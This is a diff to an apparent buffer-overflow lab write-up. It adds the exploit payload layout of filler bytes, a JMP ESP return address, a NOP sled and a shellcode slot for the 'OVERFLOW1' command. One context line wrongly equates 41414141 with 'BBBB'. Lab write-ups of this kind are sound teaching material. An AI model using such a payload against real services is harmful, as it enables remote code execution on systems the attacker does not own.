@@ -27,4 +27,11 @@ Then, I sent "OVERFLOW1" + "A"*1978 + "BBBB" to the program.
 The registers' contents are below. We could see the memory address EIP points to is filled with 41414141(="BBBB").   
 ![alt text](./images/exploit2_registers.png?raw=true) 
 
+Here are how the stack looks like when sending  
+```"OVERFLOW1 " + "A" * 1978 + "\xAF\x11\x50\x62" + "\x90" * 16 + shell code```  
+(625011AF is an address whose instruction is "JUMP ESP")  
+![alt text](./images/task2.png?raw=true) 
+
+
+
 
